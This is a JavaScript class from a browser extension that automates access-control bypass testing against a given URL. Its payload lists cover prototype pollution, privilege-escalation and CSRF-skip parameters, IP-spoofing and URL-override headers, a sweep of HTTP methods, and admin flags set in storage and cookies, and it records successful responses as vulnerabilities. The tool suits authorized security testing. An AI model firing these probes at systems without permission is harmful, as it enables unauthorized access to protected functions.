/**
 * Bypass Testing Handler for Sidebar_C_Manager
 * Manages bypass testing functionality integrated with bypass_delete extension
 */

class BypassTestingHandler {
    constructor() {
        this.isTestRunning = false;
        this.testResults = [];
        this.currentProgress = 0;
        this.totalTests = 0;
        this.testTechniques = {
            parameter: {
                name: 'Parameter Injection',
                tests: [
                    { payload: '__proto__[test]=1', description: 'Prototype pollution' },
                    { payload: '_method=DELETE', description: 'Method override parameter' },
                    { payload: 'admin=true', description: 'Privilege escalation' },
                    { payload: 'debug=1', description: 'Debug mode activation' },
                    { payload: 'test=true', description: 'Test mode bypass' },
                    { payload: 'bypass=1', description: 'Direct bypass parameter' },
                    { payload: 'override=true', description: 'Override protection' },
                    { payload: 'force=1', description: 'Force execution' },
                    { payload: 'confirm=false', description: 'Skip confirmation' },
                    { payload: 'validate=false', description: 'Skip validation' },
                    { payload: 'authenticated=true', description: 'Auth bypass' },
                    { payload: 'role=admin', description: 'Role elevation' },
                    { payload: 'unsafe=true', description: 'Unsafe mode' },
                    { payload: 'skip_check=1', description: 'Skip security check' },
                    { payload: 'no_csrf=1', description: 'CSRF bypass' }
                ]
            },
            header: {
                name: 'Header Manipulation',
                tests: [
                    { header: 'X-Forwarded-For: 127.0.0.1', description: 'IP spoofing localhost' },
                    { header: 'X-Original-URL: /admin', description: 'URL override' },
                    { header: 'X-Custom-IP-Authorization: 127.0.0.1', description: 'Custom IP auth' },
                    { header: 'X-Forwarded-Host: localhost', description: 'Host override' },
                    { header: 'X-Originating-IP: 127.0.0.1', description: 'Origin IP spoof' },
                    { header: 'X-Remote-IP: 127.0.0.1', description: 'Remote IP override' },
                    { header: 'X-Client-IP: 127.0.0.1', description: 'Client IP spoof' },
                    { header: 'X-Real-IP: 127.0.0.1', description: 'Real IP override' },
                    { header: 'X-HTTP-Method-Override: GET', description: 'Method override header' },
                    { header: 'X-Method-Override: GET', description: 'Alternative method override' },
                    { header: 'Authorization: Bearer null', description: 'Null bearer token' },
                    { header: 'X-Auth-Token: admin', description: 'Admin token injection' },
                    { header: 'X-CSRF-Token: null', description: 'Null CSRF token' },
                    { header: 'Content-Type: application/json', description: 'Content type override' },
                    { header: 'Origin: null', description: 'Null origin' }
                ]
            },
            method: {
                name: 'Method Override',
                tests: [
                    { method: 'GET', description: 'GET method' },
                    { method: 'POST', description: 'POST method' },
                    { method: 'PUT', description: 'PUT method' },
                    { method: 'PATCH', description: 'PATCH method' },
                    { method: 'DELETE', description: 'DELETE method' },
                    { method: 'OPTIONS', description: 'OPTIONS method' },
                    { method: 'HEAD', description: 'HEAD method' },
                    { method: 'CONNECT', description: 'CONNECT method' },
                    { method: 'TRACE', description: 'TRACE method' },
                    { method: 'TRACK', description: 'TRACK method' },
                    { method: 'COPY', description: 'COPY method' },
                    { method: 'LOCK', description: 'LOCK method' },
                    { method: 'MKCOL', description: 'MKCOL method' },
                    { method: 'MOVE', description: 'MOVE method' },
                    { method: 'PROPFIND', description: 'PROPFIND method' },
                    { method: 'PROPPATCH', description: 'PROPPATCH method' },
                    { method: 'SEARCH', description: 'SEARCH method' },
                    { method: 'UNLOCK', description: 'UNLOCK method' },
                    { method: 'BIND', description: 'BIND method' },
                    { method: 'REBIND', description: 'REBIND method' }
                ]
            },
            storage: {
                name: 'Storage Manipulation',
                tests: [
                    { storage: 'localStorage.setItem("admin", "true")', description: 'Admin flag in localStorage' },
                    { storage: 'localStorage.setItem("role", "administrator")', description: 'Role elevation' },
                    { storage: 'localStorage.setItem("authenticated", "true")', description: 'Auth bypass' },
                    { storage: 'localStorage.setItem("premium", "true")', description: 'Premium access' },
                    { storage: 'localStorage.setItem("verified", "true")', description: 'Verification bypass' },
                    { storage: 'sessionStorage.setItem("admin", "true")', description: 'Admin in session' },
                    { storage: 'sessionStorage.setItem("bypass", "true")', description: 'Bypass flag' },
                    { storage: 'document.cookie="admin=true"', description: 'Admin cookie' },
                    { storage: 'document.cookie="role=admin"', description: 'Role cookie' },
                    { storage: 'document.cookie="authenticated=true"', description: 'Auth cookie' },
                    { storage: 'localStorage.setItem("debug", "true")', description: 'Debug mode' },
                    { storage: 'localStorage.setItem("test", "true")', description: 'Test mode' },
                    { storage: 'localStorage.setItem("dev", "true")', description: 'Dev mode' },
                    { storage: 'localStorage.setItem("internal", "true")', description: 'Internal access' },
                    { storage: 'localStorage.setItem("staff", "true")', description: 'Staff access' },
                    { storage: 'sessionStorage.setItem("superuser", "true")', description: 'Superuser flag' },
                    { storage: 'sessionStorage.setItem("moderator", "true")', description: 'Moderator access' },
                    { storage: 'document.cookie="session=admin"', description: 'Session override' },
                    { storage: 'document.cookie="token=bypass"', description: 'Token bypass' },
                    { storage: 'document.cookie="access=full"', description: 'Full access' }
                ]
            }
        };
    }

    async startTest(targetUrl, selectedTechniques, settings) {
        if (this.isTestRunning) {
            console.log('Test already running');
            return;
        }

        this.isTestRunning = true;
        this.testResults = [];
        this.currentProgress = 0;
        
        // Calculate total tests
        this.totalTests = 0;
        for (const tech of selectedTechniques) {
            if (this.testTechniques[tech]) {
                this.totalTests += this.testTechniques[tech].tests.length;
            }
        }

        // Update UI
        this.updateProgress(0);
        this.showProgressSection(true);

        try {
            for (const technique of selectedTechniques) {
                if (!this.isTestRunning) break;
                
                const techData = this.testTechniques[technique];
                if (!techData) continue;

                for (const test of techData.tests) {
                    if (!this.isTestRunning) break;

                    // Update current test display
                    this.updateCurrentTest(`${techData.name}: ${test.description}`);

                    // Perform test
                    const result = await this.performTest(targetUrl, technique, test, settings);
                    this.testResults.push(result);

                    // Update progress
                    this.currentProgress++;
                    this.updateProgress((this.currentProgress / this.totalTests) * 100);

                    // Add delay between tests
                    if (settings && settings.requestDelay) {
                        await this.delay(settings.requestDelay);
                    }
                }
            }

            // Test completed
            this.isTestRunning = false;
            this.showResults();
            
            // Auto-export if enabled
            if (settings && settings.autoExport) {
                this.exportResults();
            }

        } catch (error) {
            console.error('Error during bypass testing:', error);
            this.isTestRunning = false;
            this.showNotification('Testing failed: ' + error.message, 'error');
        }
    }

    async performTest(targetUrl, technique, test, settings) {
        const startTime = Date.now();
        let status = 'failed';
        let response = null;
        let error = null;

        try {
            // Build request based on technique
            const requestOptions = this.buildRequest(targetUrl, technique, test);
            
            // Set timeout
            const timeout = (settings && settings.timeout) ? settings.timeout * 1000 : 10000;
            
            // Perform request with timeout
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), timeout);
            
            try {
                response = await fetch(requestOptions.url, {
                    ...requestOptions.options,
                    signal: controller.signal
                });
                clearTimeout(timeoutId);
                
                // Analyze response
                if (response.status === 200 || response.status === 204) {
                    status = 'success';
                } else if (response.status >= 400 && response.status < 500) {
                    status = 'blocked';
                } else {
                    status = 'partial';
                }
            } catch (fetchError) {
                if (fetchError.name === 'AbortError') {
                    error = 'Request timeout';
                } else {
                    error = fetchError.message;
                }
                status = 'error';
            }

        } catch (err) {
            error = err.message;
            status = 'error';
        }

        const endTime = Date.now();

        return {
            technique: technique,
            test: test.description,
            payload: test.payload || test.header || test.method || test.storage,
            status: status,
            responseCode: response ? response.status : null,
            responseTime: endTime - startTime,
            error: error,
            timestamp: new Date().toISOString()
        };
    }

    buildRequest(targetUrl, technique, test) {
        const requestOptions = {
            url: targetUrl,
            options: {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({})
            }
        };

        switch (technique) {
            case 'parameter':
                // Add parameter to URL
                const url = new URL(targetUrl);
                const [key, value] = test.payload.split('=');
                url.searchParams.append(key, value);
                requestOptions.url = url.toString();
                break;

            case 'header':
                // Add custom header
                const [headerName, headerValue] = test.header.split(': ');
                requestOptions.options.headers[headerName] = headerValue;
                break;

            case 'method':
                // Change HTTP method
                requestOptions.options.method = test.method;
                break;

            case 'storage':
                // Storage manipulation needs to be done in content script
                requestOptions.options.headers['X-Storage-Test'] = test.storage;
                break;

            default:
                break;
        }

        return requestOptions;
    }

    stopTest() {
        this.isTestRunning = false;
        this.updateCurrentTest('Test stopped');
        this.showResults();
    }

    showResults() {
        // Calculate statistics
        const stats = {
            success: 0,
            partial: 0,
            blocked: 0,
            error: 0,
            total: this.testResults.length
        };

        for (const result of this.testResults) {
            stats[result.status]++;
        }

        // Update UI
        document.getElementById('bypassSuccessCount').textContent = stats.success;
        document.getElementById('bypassPartialCount').textContent = stats.partial;
        document.getElementById('bypassFailedCount').textContent = stats.blocked + stats.error;

        // Show results section
        this.showProgressSection(false);
        document.getElementById('bypassResultsSection').style.display = 'block';

        // Enable/disable buttons
        document.getElementById('startBypassTest').disabled = false;
        document.getElementById('stopBypassTest').disabled = true;
    }

    exportResults() {
        const exportData = {
            timestamp: new Date().toISOString(),
            totalTests: this.testResults.length,
            results: this.testResults,
            summary: this.generateSummary()
        };

        // Create blob and download
        const blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `bypass-test-results-${Date.now()}.json`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);

        this.showNotification('Results exported successfully', 'success');
    }

    generateSummary() {
        const summary = {
            techniques: {},
            vulnerabilities: []
        };

        for (const result of this.testResults) {
            if (!summary.techniques[result.technique]) {
                summary.techniques[result.technique] = {
                    total: 0,
                    success: 0,
                    partial: 0,
                    blocked: 0,
                    error: 0
                };
            }

            summary.techniques[result.technique].total++;
            summary.techniques[result.technique][result.status]++;

            if (result.status === 'success' || result.status === 'partial') {
                summary.vulnerabilities.push({
                    technique: result.technique,
                    test: result.test,
                    payload: result.payload,
                    severity: result.status === 'success' ? 'high' : 'medium'
                });
            }
        }

        return summary;
    }

    updateProgress(percentage) {
        const progressFill = document.getElementById('bypassProgressFill');
        if (progressFill) {
            progressFill.style.width = `${percentage}%`;
        }

        const progressText = document.getElementById('bypassProgressText');
        if (progressText) {
            progressText.textContent = `${this.currentProgress} / ${this.totalTests} tests completed`;
        }
    }

    updateCurrentTest(testName) {
        const progressText = document.getElementById('bypassProgressText');
        if (progressText) {
            progressText.textContent = testName;
        }
    }

    showProgressSection(show) {
        const progressSection = document.getElementById('bypassProgressSection');
        if (progressSection) {
            progressSection.style.display = show ? 'block' : 'none';
        }
    }

    showNotification(message, type = 'info') {
        const notification = document.getElementById('notification');
        const notificationText = document.getElementById('notificationText');
        
        if (notification && notificationText) {
            notificationText.textContent = message;
            notification.className = `notification ${type}`;
            notification.style.display = 'block';
            
            setTimeout(() => {
                notification.classList.add('show');
            }, 10);
            
            setTimeout(() => {
                notification.classList.remove('show');
                setTimeout(() => {
                    notification.style.display = 'none';
                }, 300);
            }, 3000);
        }
    }

    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

// Export for use in other scripts
window.BypassTestingHandler = BypassTestingHandler;
